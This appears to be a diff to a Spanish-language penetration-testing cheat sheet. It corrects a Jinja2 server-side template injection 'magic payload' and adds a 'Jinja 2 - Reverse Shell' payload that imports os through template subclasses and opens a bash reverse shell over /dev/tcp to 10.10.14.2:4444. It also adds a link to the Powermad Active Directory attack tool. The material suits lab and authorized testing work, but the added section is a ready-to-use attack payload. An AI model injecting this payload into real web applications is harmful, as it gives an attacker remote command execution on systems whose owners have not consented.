@@ -1451,7 +1451,13 @@ http://<RHOST>/index.php?view=<RHOST>://shell.php
 ####  5.8.1. <a name='magic-payload'></a>Magic Payload
 
 ```bash
-{{ ‘’.__class__.__mro__[1].__subclasses__() }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+```
+
+#### Jinja 2 - Reverse Shell
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").read()}}{%endif%}{%endfor%}
 ```
 
 ##  6. <a name='pivoting'></a>Pivoting
@@ -5289,8 +5295,13 @@ Enlaces a las distintas herramientas y recursos.
 | CeWL                          | [https://github.com/digininja/cewl](https://github.com/digininja/cewl)                                             |
 | API Wordlist                  | https://github.com/chrislockard/api_wordlist/blob/master/api_seen_in_wild.txt                                      |
 
-###  12.7. <a name='escalación-de-privilegios-3'></a>Escalación de Privilegios
+### Active Directory
 
+| Nombre   | URL                                                      |
+| -------- | -------------------------------------------------------- |
+| Powermad | https://github.com/Kevin-Robertson/Powermad              |
+
+###  12.7. <a name='escalación-de-privilegios-3'></a>Escalación de Privilegios
 
 | Nombre   | URL                                                      |
 | -------- | -------------------------------------------------------- |
